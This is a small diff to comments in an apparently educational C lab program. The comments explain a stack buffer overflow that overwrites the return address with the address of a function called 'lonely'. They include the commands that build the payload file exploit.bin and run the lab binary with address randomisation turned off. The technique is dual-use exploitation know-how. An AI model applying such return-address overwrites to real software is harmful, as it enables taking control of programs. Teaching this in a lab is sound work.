@@ -78,7 +78,15 @@ int main()
 // need 16 bytes of whatever, and then the address of lonely
 // in little endian format so that it's stored correctly in the return address location
 
-// echo -ne "1234567890123456\x89\x51\x55\x55\x55\x55\x00\x00" > exploit.bin
+/*
+(
+    printf("1234567890123456")
+
+    printf("\x89\x51\x55\x55\x55\x55\x00\x00") > exploit.bin
+)
+
+
+*/
 
 // now run it with our exploit input
 // setarch -R ./lab < exploit.bin
